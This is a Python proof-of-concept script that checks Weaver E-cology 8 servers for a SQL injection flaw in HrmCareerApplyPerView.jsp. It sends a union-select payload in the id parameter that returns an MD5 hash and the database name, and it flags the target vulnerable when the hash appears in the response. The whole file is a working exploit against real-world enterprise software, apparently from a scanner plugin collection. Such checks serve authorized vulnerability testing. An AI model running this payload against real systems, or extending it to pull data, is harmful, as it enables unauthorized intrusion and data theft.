import urllib

import requests

def verify(url):
    relsult = {
        'name': '泛微E-ecology 8 HrmCareerApplyPerView 存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7")
    try:
        response = requests.get(vurl, headers=headers, timeout=timeout)
        if response.status_code == 200 and '0x900150983cd24fb0d6963f7d28e17f72' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult
    except:
        return relsult